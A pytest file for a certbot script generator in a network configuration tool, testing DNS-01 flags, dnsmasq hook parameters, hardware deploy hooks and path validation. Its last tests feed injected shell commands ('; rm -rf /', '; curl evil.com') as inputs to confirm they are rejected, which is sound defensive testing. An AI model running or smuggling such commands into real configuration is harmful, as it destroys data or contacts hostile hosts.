"""Tests for the Let's Encrypt certbot generator (DNS-01 validation)."""

import pytest

from gdoc2netcfg.derivations.dns_names import derive_all_dns_names
from gdoc2netcfg.derivations.hardware import (
    HARDWARE_NETGEAR_SWITCH,
    HARDWARE_SUPERMICRO_BMC,
)
from gdoc2netcfg.generators.letsencrypt import generate_letsencrypt
from gdoc2netcfg.models.addressing import IPv4Address, IPv6Address, MACAddress
from gdoc2netcfg.models.host import Host, NetworkInterface, NetworkInventory
from gdoc2netcfg.models.network import IPv6Prefix, Site

SITE = Site(
    name="welland",
    domain="welland.mithis.com",
    site_octet=1,
    ipv6_prefixes=[IPv6Prefix(prefix="2404:e80:a137:", name="Launtel")],
    network_subdomains={
        8: "int", 9: "int", 10: "int", 11: "int",
        12: "int", 13: "int", 14: "int", 15: "int",
        90: "iot",
    },
)


def _make_host(
    hostname="desktop",
    ip="10.1.10.100",
    hardware_type=None,
    iface_name=None,
):
    ipv4 = IPv4Address(ip)
    parts = ip.split(".")
    aa = parts[1]
    bb = parts[2].zfill(2)
    ccc = parts[3]
    ipv6 = IPv6Address(f"2404:e80:a137:{aa}{bb}::{ccc}", "2404:e80:a137:")

    host = Host(
        machine_name=hostname,
        hostname=hostname,
        interfaces=[
            NetworkInterface(
                name=iface_name,
                mac=MACAddress.parse("aa:bb:cc:dd:ee:ff"),
                ipv4=ipv4,
                ipv6_addresses=[ipv6],
                dhcp_name=hostname,
            ),
        ],
        default_ipv4=ipv4,
        subdomain="int",
        hardware_type=hardware_type,
    )
    derive_all_dns_names(host, SITE)
    return host


def _make_inventory(*hosts):
    return NetworkInventory(site=SITE, hosts=list(hosts))


class TestCertScripts:
    def test_single_host_produces_cert_script(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        cert_key = "certs-available/desktop.welland.mithis.com"
        assert cert_key in files
        assert "renew-enabled.sh" in files

    def test_cert_script_is_shell(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["certs-available/desktop.welland.mithis.com"]
        assert script.startswith("#!/bin/sh\n")

    def test_cert_script_uses_manual_dns(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["certs-available/desktop.welland.mithis.com"]
        assert "certbot certonly --manual" in script
        assert "--preferred-challenges dns" in script

    def test_cert_script_no_webroot(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["certs-available/desktop.welland.mithis.com"]
        assert "--webroot" not in script
        assert "-w " not in script

    def test_cert_script_references_auth_hook(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["certs-available/desktop.welland.mithis.com"]
        assert "--manual-auth-hook" in script
        assert "certbot-hook-dnsmasq auth-hook" in script

    def test_cert_script_has_cleanup_hook(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["certs-available/desktop.welland.mithis.com"]
        assert "--manual-cleanup-hook" in script
        assert "certbot-hook-dnsmasq cleanup-hook" in script

    def test_cleanup_hook_has_same_dnsmasq_flags_as_auth_hook(self):
        host = _make_host()
        files = generate_letsencrypt(
            _make_inventory(host),
            dnsmasq_conf_dir="/opt/dnsmasq/ext",
            dnsmasq_conf="/opt/dnsmasq/ext.conf",
            dnsmasq_service="dnsmasq@custom",
        )

        script = files["certs-available/desktop.welland.mithis.com"]
        # Both hooks should have the same dnsmasq flags
        for hook_type in ("auth-hook", "cleanup-hook"):
            assert f"{hook_type} --conf-dir /opt/dnsmasq/ext" in script
            assert "--conf /opt/dnsmasq/ext.conf" in script
            assert "--service dnsmasq@custom" in script

    def test_cert_script_passes_dnsmasq_as_cli_flags(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["certs-available/desktop.welland.mithis.com"]
        # No env var exports
        assert "export DNSMASQ_" not in script
        # Dnsmasq params appear as CLI flags in the auth hook command
        assert "--conf-dir /etc/dnsmasq.d/external" in script
        assert "--conf /etc/dnsmasq.d/dnsmasq.external.conf" in script
        assert "--service dnsmasq@external" in script

    def test_custom_auth_hook(self):
        host = _make_host()
        files = generate_letsencrypt(
            _make_inventory(host),
            auth_hook="/usr/local/bin/my-dns-hook",
        )

        script = files["certs-available/desktop.welland.mithis.com"]
        assert "/usr/local/bin/my-dns-hook auth-hook" in script

    def test_custom_dnsmasq_params(self):
        host = _make_host()
        files = generate_letsencrypt(
            _make_inventory(host),
            dnsmasq_conf_dir="/opt/dnsmasq/ext",
            dnsmasq_conf="/opt/dnsmasq/ext.conf",
            dnsmasq_service="dnsmasq@custom",
        )

        script = files["certs-available/desktop.welland.mithis.com"]
        assert "--conf-dir /opt/dnsmasq/ext" in script
        assert "--conf /opt/dnsmasq/ext.conf" in script
        assert "--service dnsmasq@custom" in script

    def test_cert_name_is_primary_fqdn(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["certs-available/desktop.welland.mithis.com"]
        assert "--cert-name desktop.welland.mithis.com" in script

    def test_only_fqdns_included_as_domains(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["certs-available/desktop.welland.mithis.com"]
        assert "-d desktop.welland.mithis.com" in script
        assert "-d desktop.int.welland.mithis.com" in script
        # Short name should NOT appear as -d
        assert "-d desktop\n" not in script

    def test_includes_ip_prefix_fqdns(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["certs-available/desktop.welland.mithis.com"]
        assert "-d ipv4.desktop.welland.mithis.com" in script
        assert "-d ipv6.desktop.welland.mithis.com" in script

    def test_renew_script(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["renew-enabled.sh"]
        assert script.startswith("#!/bin/sh\n")
        assert "certs-enabled/*" in script

    def test_host_with_no_fqdns_skipped(self):
        host = Host(
            machine_name="local",
            hostname="local",
            interfaces=[
                NetworkInterface(
                    name=None,
                    mac=MACAddress.parse("aa:bb:cc:dd:ee:ff"),
                    ipv4=IPv4Address("192.168.1.1"),
                    ipv6_addresses=[],
                    dhcp_name="local",
                ),
            ],
            default_ipv4=IPv4Address("192.168.1.1"),
        )
        # No dns_names set → no FQDNs
        files = generate_letsencrypt(_make_inventory(host))

        # Only renew-enabled.sh, no cert scripts
        assert len(files) == 1
        assert "renew-enabled.sh" in files

    def test_no_generated_hook_scripts(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        hook_files = [k for k in files if k.startswith("hooks/")]
        assert len(hook_files) == 0


class TestDeployHooks:
    def test_supermicro_bmc_gets_hook(self):
        host = _make_host(
            hostname="bmc.big-storage",
            ip="10.1.10.50",
            hardware_type=HARDWARE_SUPERMICRO_BMC,
        )
        files = generate_letsencrypt(_make_inventory(host))

        cert_key = next(k for k in files if k.startswith("certs-available/"))
        script = files[cert_key]
        assert "--deploy-hook" in script
        assert "certbot-hook-bmc-ipmi-supermicro" in script

    def test_netgear_switch_gets_hook(self):
        host = _make_host(
            hostname="switch01",
            ip="10.1.10.51",
            hardware_type=HARDWARE_NETGEAR_SWITCH,
        )
        files = generate_letsencrypt(_make_inventory(host))

        cert_key = next(k for k in files if k.startswith("certs-available/"))
        script = files[cert_key]
        assert "--deploy-hook" in script
        assert "certbot-hook-netgear-switches" in script

    def test_no_hardware_type_no_hook(self):
        host = _make_host()
        files = generate_letsencrypt(_make_inventory(host))

        script = files["certs-available/desktop.welland.mithis.com"]
        assert "--deploy-hook" not in script

    def test_deploy_hook_coexists_with_auth_hook(self):
        host = _make_host(
            hostname="bmc.big-storage",
            ip="10.1.10.50",
            hardware_type=HARDWARE_SUPERMICRO_BMC,
        )
        files = generate_letsencrypt(_make_inventory(host))

        cert_key = next(k for k in files if k.startswith("certs-available/"))
        script = files[cert_key]
        assert "--manual-auth-hook" in script
        assert "--deploy-hook" in script

    def test_multiple_hosts(self):
        h1 = _make_host(hostname="desktop", ip="10.1.10.100")
        h2 = _make_host(hostname="server", ip="10.1.10.200")
        files = generate_letsencrypt(_make_inventory(h1, h2))

        # 2 cert scripts + 1 renew
        cert_files = [k for k in files if k.startswith("certs-available/")]
        assert len(cert_files) == 2
        assert "renew-enabled.sh" in files


class TestPathValidation:
    def test_rejects_malicious_auth_hook(self):
        host = _make_host()
        with pytest.raises(ValueError, match="Unsafe auth_hook"):
            generate_letsencrypt(
                _make_inventory(host),
                auth_hook="/opt/hooks; rm -rf /",
            )

    def test_rejects_malicious_dnsmasq_conf_dir(self):
        host = _make_host()
        with pytest.raises(ValueError, match="Unsafe dnsmasq_conf_dir"):
            generate_letsencrypt(
                _make_inventory(host),
                dnsmasq_conf_dir="/etc; rm -rf /",
            )

    def test_rejects_malicious_dnsmasq_service(self):
        host = _make_host()
        with pytest.raises(ValueError, match="Unsafe dnsmasq_service"):
            generate_letsencrypt(
                _make_inventory(host),
                dnsmasq_service="dnsmasq; curl evil.com",
            )

    def test_accepts_valid_auth_hook(self):
        host = _make_host()
        files = generate_letsencrypt(
            _make_inventory(host),
            auth_hook="/opt/certbot/hooks/dnsmasq-hook.sh",
        )
        cert_files = [k for k in files if k.startswith("certs-available/")]
        assert len(cert_files) > 0
